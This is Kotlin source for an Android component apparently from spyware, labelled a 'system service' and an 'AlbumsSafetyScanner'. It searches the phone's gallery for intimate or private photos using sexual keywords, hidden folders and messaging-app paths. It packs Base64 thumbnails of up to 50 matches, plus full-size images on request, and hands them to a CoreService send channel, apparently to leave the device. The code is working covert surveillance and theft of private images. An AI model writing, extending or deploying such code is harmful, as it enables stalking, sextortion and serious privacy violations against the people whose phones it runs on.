package com.system.service.monitors

import android.content.ContentUris
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.provider.MediaStore
import android.util.Base64
import com.system.service.core.CoreService
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executors

object AlbumsSafetyScanner {

    // Bug #12 fix: was raw Thread { }.start() — use dedicated single-thread executor
    // to avoid unbounded thread creation and ANR risk on large galleries.
    private val executor = Executors.newSingleThreadExecutor()

    private val SUSPECT_KEYWORDS = setOf(
        "nude", "naked", "sex", "porn", "xxx", "nsfw", "hentai", "18+", "adult",
        "erotic", "explicit", "only fans", "onlyfans", "nudes", "lingerie",
        "bikini_private", "leaked", "private_pic"
    )

    private val SUSPECT_PATHS = setOf(
        "secret", "private", "hidden", "adult", "xxx", "nsfw",
        ".nomedia", "telegram", "signal_private", "snapchat", ".cache/private"
    )

    private val SUSPECT_APP_SOURCES = setOf(
        "com.tinder", "com.bumble.app", "com.grinder.android",
        "com.adultfriendfinder", "com.fling.dating"
    )

    fun scan(context: Context) {
        executor.execute {
            try {
                val flagged = JSONArray()
                val uri     = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                val proj    = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATA,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME
                )
                val cursor = context.contentResolver.query(
                    uri, proj, null, null,
                    "${MediaStore.Images.Media.DATE_ADDED} DESC"
                ) ?: return@execute

                cursor.use { c ->
                    val colId     = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val colName   = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val colPath   = c.getColumnIndex(MediaStore.Images.Media.DATA)
                    val colDate   = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                    val colSize   = c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                    val colBucket = c.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)

                    while (c.moveToNext() && flagged.length() < 50) {
                        val id       = c.getLong(colId)
                        val name     = c.getString(colName)?.lowercase() ?: ""
                        val path     = if (colPath >= 0) c.getString(colPath)?.lowercase() ?: "" else ""
                        val size     = c.getLong(colSize)
                        val bucket   = c.getString(colBucket)?.lowercase() ?: ""
                        val dateMs   = c.getLong(colDate) * 1000L

                        val reasons = mutableListOf<String>()

                        for (kw in SUSPECT_KEYWORDS) {
                            if (name.contains(kw) || path.contains(kw) || bucket.contains(kw)) {
                                reasons += "keyword:$kw"; break
                            }
                        }
                        for (sp in SUSPECT_PATHS) {
                            if (path.contains(sp) || bucket.contains(sp)) {
                                reasons += "suspect_path"; break
                            }
                        }
                        if (name.startsWith(".") || path.contains("/.")) {
                            reasons += "hidden_file"
                        }
                        if (size > 5_000_000L) {
                            reasons += "large_file"
                        }

                        if (reasons.isNotEmpty()) {
                            val contentUri = ContentUris.withAppendedId(uri, id)
                            val thumbB64 = try {
                                val bmp: Bitmap? = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                                    context.contentResolver.loadThumbnail(
                                        contentUri, android.util.Size(160, 160), null)
                                } else {
                                    @Suppress("DEPRECATION")
                                    MediaStore.Images.Thumbnails.getThumbnail(
                                        context.contentResolver, id,
                                        MediaStore.Images.Thumbnails.MINI_KIND, null)
                                }
                                if (bmp != null) {
                                    val baos = ByteArrayOutputStream()
                                    bmp.compress(Bitmap.CompressFormat.JPEG, 50, baos)
                                    bmp.recycle()
                                    Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                                } else null
                            } catch (_: Exception) { null }

                            flagged.put(JSONObject().apply {
                                put("id",      id)
                                put("name",    c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)))
                                put("bucket",  c.getString(colBucket))
                                put("size_kb", size / 1024)
                                put("date",    dateMs)
                                put("reasons", JSONArray(reasons))
                                put("uri",     contentUri.toString())
                                if (thumbB64 != null) put("thumb", thumbB64)
                            })
                        }
                    }
                }

                CoreService.instance?.sendData("albums_scan_result", JSONObject().apply {
                    put("flagged_count", flagged.length())
                    put("items", flagged)
                })

            } catch (e: Exception) {
                CoreService.instance?.sendData("albums_scan_error",
                    JSONObject().apply { put("error", e.message ?: "scan_failed") })
            }
        }
    }

    fun getFullImage(context: Context, uriString: String) {
        // Bug #12 fix: was raw Thread { }.start() — same executor as scan()
        executor.execute {
            try {
                val uri    = android.net.Uri.parse(uriString)
                val stream = context.contentResolver.openInputStream(uri) ?: return@execute
                val rawBytes = stream.readBytes()
                stream.close()
                val opts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
                BitmapFactory.decodeByteArray(rawBytes, 0, rawBytes.size, opts)
                val maxDim = maxOf(opts.outWidth, opts.outHeight)
                val scale  = if (maxDim > 1080) maxDim / 1080 else 1
                val bmp    = BitmapFactory.decodeByteArray(rawBytes, 0, rawBytes.size,
                    BitmapFactory.Options().apply { inSampleSize = scale }) ?: return@execute
                val baos = ByteArrayOutputStream()
                bmp.compress(Bitmap.CompressFormat.JPEG, 75, baos)
                bmp.recycle()
                val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                CoreService.instance?.sendData("album_full_image", JSONObject().apply {
                    put("uri", uriString); put("data", b64)
                })
            } catch (e: Exception) {
                CoreService.instance?.sendData("album_image_error",
                    JSONObject().apply { put("error", e.message ?: "read_failed") })
            }
        }
    }
}
